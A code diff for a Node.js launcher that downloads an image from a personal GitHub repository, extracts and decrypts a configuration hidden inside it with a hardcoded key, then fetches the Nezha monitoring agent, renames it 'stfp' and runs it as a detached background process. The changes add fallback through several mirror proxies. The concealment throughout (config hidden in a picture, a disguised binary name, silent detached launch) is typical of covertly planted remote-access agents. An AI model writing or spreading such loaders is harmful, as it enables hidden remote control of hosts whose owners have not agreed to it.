@@ -11,15 +11,25 @@ const AdmZip = require('adm-zip');
 // ========== 路径配置 ==========
 const BASEDIR = path.join(process.cwd(), '.npm_logs');
 const CACHE_DIR = path.join(process.cwd(), 'agent_cache');
+const TMP_DIR = path.join(process.cwd(), '.tmp_dl');      // 临时下载目录，避免被自己删掉
 const AGENT_BIN = path.join(CACHE_DIR, 'stfp');
 const CONFIG_PATH = path.join(CACHE_DIR, 'config.yml');
 const LOCAL_IMAGE_PATH = path.join(CACHE_DIR, 'dknz.png');
-const ZIP_PATH = path.join(CACHE_DIR, 'agent.zip');
+const ZIP_PATH = path.join(TMP_DIR, 'agent.zip');         // zip 放到临时目录
 
 const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;
 
+// 镜像代理列表，按顺序尝试，避免单点故障
+const GH_PROXIES = [
+    'https://gh-proxy.com/',
+    'https://mirror.ghproxy.com/',
+    'https://ghproxy.net/',
+    ''  // 直连兜底
+];
+
 ensureDir(BASEDIR);
 ensureDir(CACHE_DIR);
+ensureDir(TMP_DIR);
 
 const CRYPTO_KEY = "1234567890abcdef1234567890abcdef";
 
@@ -44,6 +54,25 @@ function fetchText(url) {
         };
         request(url);
     });
+}
+
+// 多代理下载文件，任意一个成功即返回
+async function fetchFileWithFallback(rawUrl, destPath) {
+    let lastErr = null;
+    for (const proxy of GH_PROXIES) {
+        const fullUrl = proxy ? `${proxy}${rawUrl}` : rawUrl;
+        try {
+            console.log(`  尝试下载: ${fullUrl}`);
+            await fetchFile(fullUrl, destPath);
+            console.log(`  下载成功: ${fullUrl}`);
+            return true;
+        } catch (e) {
+            console.warn(`  下载失败: ${e.message}`);
+            lastErr = e;
+            if (existsSync(destPath)) unlinkSync(destPath);
+        }
+    }
+    throw lastErr || new Error('所有代理均下载失败');
 }
 
 function fetchFile(url, destPath) {
@@ -99,21 +128,21 @@ function parseImageMetadata(imagePath) {
         const buffer = fs.readFileSync(imagePath);
         const startMarker = Buffer.from('==NZ_CONFIG_START==');
         const endMarker = Buffer.from('==NZ_CONFIG_END==');
-        
+
         const startPos = buffer.indexOf(startMarker);
         if (startPos === -1) {
             console.error("图片中未找到配置起始标记");
             return null;
         }
-        
+
         const endPos = buffer.indexOf(endMarker, startPos);
         if (endPos === -1) {
             console.error("图片中未找到配置结束标记");
             return null;
         }
-        
+
         const payloadStr = buffer.slice(startPos + startMarker.length, endPos).toString('utf8').trim();
-        
+
         const parts = payloadStr.split(':');
         const iv = Buffer.from(parts.shift(), 'hex');
         const encrypted = Buffer.from(parts.join(':'), 'hex');
@@ -159,10 +188,12 @@ async function startNezhaAgent() {
 
         console.log("===== 开始启动哪吒进程 =====");
 
-        // 1. 下载配置图片（国内加速代理）
-        const imageUrl = 'https://ghproxy.com/https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
-        console.log("1. 下载配置图片:", imageUrl);
-        await fetchFile(imageUrl, LOCAL_IMAGE_PATH);
+        // 0. 保存当前已解析的配置（如果有），避免下面 rmSync 误删导致丢配置
+        const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
+
+        // 1. 下载配置图片（多代理兜底）
+        console.log("1. 下载配置图片");
+        await fetchFileWithFallback(imageUrl, LOCAL_IMAGE_PATH);
         console.log("图片下载完成");
 
         // 2. 解析加密配置
@@ -180,18 +211,20 @@ async function startNezhaAgent() {
         const uuid = generateUUID(ip);
         console.log("3. 生成UUID:", uuid);
 
-        // 4. 下载并解压agent二进制（纯JS解压，无系统依赖）
+        // 4. 下载并解压 agent 二进制
         if (!existsSync(AGENT_BIN)) {
             console.log("4. 下载哪吒agent二进制包");
             const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
             const arch = archMap[process.arch] || 'amd64';
-            const downloadUrl = `https://ghproxy.com/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;
-            console.log("下载地址:", downloadUrl);
-            
-            await fetchFile(downloadUrl, ZIP_PATH);
+            const rawUrl = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;
+            console.log("下载地址:", rawUrl);
+
+            // 先把 zip 下载到 TMP_DIR（不会被后面的 rmSync 影响）
+            ensureDir(TMP_DIR);
+            await fetchFileWithFallback(rawUrl, ZIP_PATH);
             console.log("压缩包下载完成，开始解压");
 
-            // 清空目录重新解压
+            // 清空 CACHE_DIR 重新解压（此时 dknz.png 也会被删，但配置已经在内存里）
             if (existsSync(CACHE_DIR)) rmSync(CACHE_DIR, { recursive: true, force: true });
             ensureDir(CACHE_DIR);
 
@@ -203,6 +236,11 @@ async function startNezhaAgent() {
             } catch (e) {
                 console.error("解压失败:", e.message);
                 return false;
+            } finally {
+                // 清理临时 zip
+                if (existsSync(ZIP_PATH)) {
+                    try { unlinkSync(ZIP_PATH); } catch (_) {}
+                }
             }
 
             // 重命名为 stfp
@@ -254,7 +292,7 @@ uuid: '${uuid}'
         });
 
         agentProcess.unref();
-        
+
         // 监听进程退出，清空实例
         agentProcess.on('exit', () => {
             agentProcess = null;
